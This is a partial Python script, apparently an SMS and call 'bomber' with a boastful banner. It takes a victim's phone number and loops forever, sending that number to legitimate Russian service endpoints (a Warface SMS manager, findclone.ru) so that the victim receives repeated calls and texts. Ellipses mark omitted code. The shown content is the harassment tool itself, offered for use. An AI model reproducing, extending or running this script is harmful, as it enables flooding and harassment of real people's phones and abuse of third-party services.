...
| [--] Name: bye bye phone :)                                 |
|                                                    |                                                                          |
| [--] Version: created by vk.com/nodoser1337        |                       
|____________________________________________________|
"""

print(banner)
_phone = input('hacked by doser <3 -->> ')
...
while True:
	...
	email = _name+f'{iteration}'+'@gmail.com'
    	...
    	try:
		requests.get('https://wf.mail.ru/sms/manage', params={'phone': '+' + _phone})
		print('[+] WARFACE звонок отправлен!')
	except:
		print('[-] Не отправлено!')
	...
	try:
		requests.get('https://findclone.ru/', params={'phone': '+' + _phone})
